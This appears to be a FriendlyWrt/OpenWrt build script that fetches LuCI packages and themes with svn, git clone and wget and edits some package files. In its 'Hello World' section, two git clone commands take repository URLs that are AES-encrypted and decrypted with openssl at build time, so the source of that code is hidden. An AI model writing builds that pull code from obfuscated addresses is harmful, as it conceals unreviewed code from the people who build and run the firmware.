# Enter the "package" directory.
cd package

# lean
svn co https://github.com/coolsnowwolf/lede/trunk/package/lean
cp -r lean/* ./
rm -rf lean luci-lib-docker luci-app-docker luci-app-diskman luci-theme-argon parted
[ -f luci-app-ttyd/root/etc/init.d/ttyd ] && rm luci-app-ttyd/root/etc/init.d/ttyd
[ -f luci-app-rclone/luasrc/controller/rclone.lua ] && sed -i '/firstchild/Id;s/nas/services/g' luci-app-rclone/luasrc/controller/rclone.lua

# luci-theme-argon
git clone -b 18.06 https://github.com/jerrykuku/luci-theme-argon.git

# ServerChan
git clone https://github.com/tty228/luci-app-serverchan

# dockerman
svn co https://github.com/lisaac/luci-app-dockerman/trunk/applications/luci-app-dockerman
svn co https://github.com/lisaac/luci-lib-docker/trunk/collections/luci-lib-docker

# Hello World
git clone $(echo "U2FsdGVkX19rLB6+p9PTQ4vYxR44NjdJyeaDSycm+tf1tD9TdwcO2G709oObETLrOXU8nL1QJgyeQ7i1kvpzxw==" | openssl enc -aes-256-cbc -a -d -pass pass:"vinewx" -pbkdf2)
git clone $(echo "U2FsdGVkX18IqdmKGw7uDXMoFzS68Oa5uzdQiOKziUNuWax+tac5Bw+yWunW47NOXMzP7EypFuVFj7i3FyoGeg==" | openssl enc -aes-256-cbc -a -d -pass pass:"vinewx" -pbkdf2)

# Return to "friendlywrt" directory.
cd ../

# diskman
mkdir -p package/luci-app-diskman
wget https://raw.githubusercontent.com/lisaac/luci-app-diskman/master/Makefile -O package/luci-app-diskman/Makefile
mkdir -p package/parted
wget https://raw.githubusercontent.com/lisaac/luci-app-diskman/master/Parted.Makefile -O package/parted/Makefile
